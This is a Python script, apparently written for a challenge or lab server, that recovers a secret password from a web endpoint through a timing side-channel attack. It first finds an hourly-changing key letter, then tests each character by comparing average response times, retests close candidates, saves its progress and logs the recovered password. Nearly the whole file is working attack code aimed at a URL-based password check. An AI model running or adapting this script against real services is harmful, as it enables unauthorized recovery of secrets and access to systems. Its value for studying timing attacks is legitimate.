from statistics import mean
import requests
import time
from datetime import datetime

# URL = "https://barfishilev.pythonanywhere.com/"
URL = "http://127.0.0.1:5000/"
REPEAT_CHECK = 8
POOL = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
# Alternative smaller pool for testing:
# POOL = 'aopqsAPTU16790'
PADDING_LENGTH = 12
MAX_PASSWORD_LENGTH = 6

last_day = -1
last_hour = -1
current_letter = ''


def save_progress(found_char, url=URL):
    with open(f"{url[8:-20]}_progress.txt", "a") as f:
        f.write(found_char)
 

def load_progress(url=URL):
    try:
        with open(f"{url[8:-20]}_progress.txt", "r") as f:
            return f.read().strip()
    except Exception:
        return ""


def log_save(message, url=URL):
    with open(f"{url[8:-20]}_log.txt", "a") as f:
        f.write(f"{message}\n")


def timeit(url2check,  repeat=1):
    """
    Measures the average response time for a given URL over a number of requests.
    
    :param url2check: (str) The URL to check.
    :param repeat: (int) The number of times to repeat the request.
    :return: (float) The average response time after removing outliers.
    """
    times = []
    for _ in range(repeat):
        start = time.time()
        r = requests.get(url2check, allow_redirects=True)
        end = time.time()
        times.append(end - start)

    removed = remove_4(times)
    if repeat > 15:
        removed = remove_4(removed)

    return mean(removed)


def remove_4(times):
    """
    Removes the two highest and two lowest values from the list.
    
    :param times: (list) List of timing values.
    :return: (list) The list after removing the outliers.
    """
    times.sort()
    times.pop(0)
    times.pop(0)
    times.pop(-1)
    times.pop(-1)
    return times


def check_server_load(time_taken, repeat, threshold, retries, wait_time, url2check):
    """Checks if the server is overloaded based on the time taken for a request."""
    count = 0
    while time_taken > threshold:
        log_save('Request took too long, possible server issue. Retrying after wait...')
        time.sleep(wait_time)
        check_hour_change()
        time_taken = timeit(url2check, repeat)
        log_save(f'RETRY TIME: {time_taken}')
        count += 1

        if count >= retries:
            log_save('Server is too loaded and slow, please try again later.')
            raise Exception('Server is too loaded and slow, please try again later.')
    return time_taken


def find_cur_letter(url, pool, padding_length):
    """
    Finds the current key letter by measuring response times of every char
    in the pool. The char with the lowest response time is the key letter.
    If no char shows a significant time difference, the 4 lowest are retested.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param padding_length: (int) The length of the padding to use.
    :return: (char) The current key letter.
    """
    wrong_time = timeit(url + '*' * padding_length, REPEAT_CHECK)
    timings = {}
    for ch in pool:
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + ch * padding_length
        t = timeit(test_url, REPEAT_CHECK)
        t = check_server_load(t, REPEAT_CHECK, wrong_time + 1, 3, 100, test_url)
        timings[ch] = t
        log_save(f'KEY: {ch} | TIME: {t}')
        if wrong_time - t > 0.4:
            log_save('=========================\n' \
                     f'KEY FOUND: {ch}\n' \
                     '=========================')
            return ch

    sorted_timings = sorted(timings.items(), key=lambda x: x[1])
    lowest_time_chars = {}
    log_save('=========================\n' \
             'Checking 4 lowest keys...')
    for i in range(4):
        last_key_letter = current_letter
        check_hour_change()
        if last_key_letter != current_letter:
            return current_letter
        
        test_url = url + sorted_timings[i][0] * padding_length
        t = timeit(test_url, REPEAT_CHECK + 5)
        t = check_server_load(t, REPEAT_CHECK + 5, wrong_time + 1, 3, 100, test_url)
        lowest_time_chars[sorted_timings[i][0]] = t
        log_save(f'KEY: {sorted_timings[i][0]} | TIME: {t}')
    
    sorted_timings = sorted(lowest_time_chars.items(), key=lambda x: x[1])
    log_save('=========================\n' \
             f'KEY FOUND: {sorted_timings[0][0]}' \
             '\n=========================')
    return sorted_timings[0][0]


def check_hour_change():
    global last_day, last_hour, current_letter

    now = datetime.now()

    if now.minute >= 58:
        log_save(f"Hour will change in ~2 minutes. Waiting...")
        time.sleep(120)
        now = datetime.now()

    day = now.day
    hour = now.hour

    if hour != last_hour or day != last_day:
        last_day = day
        last_hour = hour

        log_save('=========================\n' \
                 'Hour/Day changed, finding new key letter...')
        current_letter = find_cur_letter(URL, POOL, PADDING_LENGTH)


def hack_password(url, pool, max_length, padding_length):
    """
    Hacks the password by finding the key letter and then finding each character
    one by one using timing attacks, by replacing the key letter at the current position
    with each character from the pool.
    If there is no significant timing difference for a character, 
    it retests the 4 lowest candidates.
    If the hour changes during the process, it updates the key letter.
    
    :param url: (str) The base URL to test.
    :param pool: (str) The pool of characters to test.
    :param max_length: (int) The maximum length of the password.
    :param padding_length: (int) The length of the padding to use.
    :return: (str) The hacked password.
    """
    password = []
    possible_chars = ' ' + pool
    
    progress = load_progress()
    for ch in progress:
        password.append(ch)
    log_save(f'LOADED PROGRESS: {"".join(password).strip()}')

    for i in range(len(progress), max_length):
        timings = {}

        check_hour_change()
        test_wrong_pass = [current_letter] * padding_length
        test_wrong_pass[i + max_length] = '*'
        test_wrong_url = url + ''.join(test_wrong_pass)
        wrong_time = timeit(test_wrong_url, 20)

        for ch in possible_chars:
            check_hour_change()

            test_pass = [current_letter] * padding_length
            test_pass[i + max_length] = ch
            test_url = url + ''.join(test_pass)
            t = timeit(test_url, REPEAT_CHECK)
            log_save(f'POS: {i} | CHAR: {ch} | TIME: {t}')

            t = check_server_load(t, REPEAT_CHECK, wrong_time + 1, 3, 100, test_url)
                
            if wrong_time - t > 0.2 and ch != current_letter:
                password.append(ch)
                log_save('=============================\n' \
                         f'CHAR FOUND: {ch} | AT POS {i}\n' \
                         f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
                         '=============================')
                save_progress(ch)
                break

            timings[ch] = t

        else:
            sorted_timings = sorted(timings.items(), key=lambda x: x[1])
            lowest_time_chars = {}
            log_save('=============================\n' \
                     'Checking 4 lowest chars...')
            for j in range(4):
                check_hour_change()

                test_pass = [current_letter] * padding_length
                test_pass[i + max_length] = sorted_timings[j][0]
                test_url = url + ''.join(test_pass)
                t = timeit(test_url, REPEAT_CHECK + 5)
                t = check_server_load(t, REPEAT_CHECK + 5, wrong_time + 1, 3, 100, test_url)
                lowest_time_chars[sorted_timings[j][0]] = t
                log_save(f'CHAR: {sorted_timings[j][0]} | TIME: {t}')
            
            sorted_lowest = sorted(lowest_time_chars.items(), key=lambda x: x[1])
            password.append(sorted_lowest[0][0])
            log_save('=============================\n' \
                     f'CHAR FOUND: {sorted_lowest[0][0]} | AT POS {i}\n' \
                     f'CURRENT PASSWORD: {"".join(password).strip()}\n' \
                     '=============================')
            save_progress(sorted_lowest[0][0])
    
    secret_password = ''.join(password).strip()
    log_save('===========================================\n' \
             'HACKING COMPLETE!\n' \
             f'SECRET PASSWORD FOUND: {secret_password}\n' \
             f'URL: {URL}{secret_password}\n' \
             '===========================================')
    return secret_password


def check_password(url, password):
    """
    Checks if the given password is correct by sending a request to the server.
    '1' indicates a correct password, while '0' indicates an incorrect one.
    """
    r = requests.get(url + password, allow_redirects=True)
    value = r.text
    return value == '1'

if __name__ == '__main__':
    secret_password = hack_password(URL, POOL, MAX_PASSWORD_LENGTH, PADDING_LENGTH)
    log_save(f'IS CORRECT: {check_password(URL, secret_password)}')
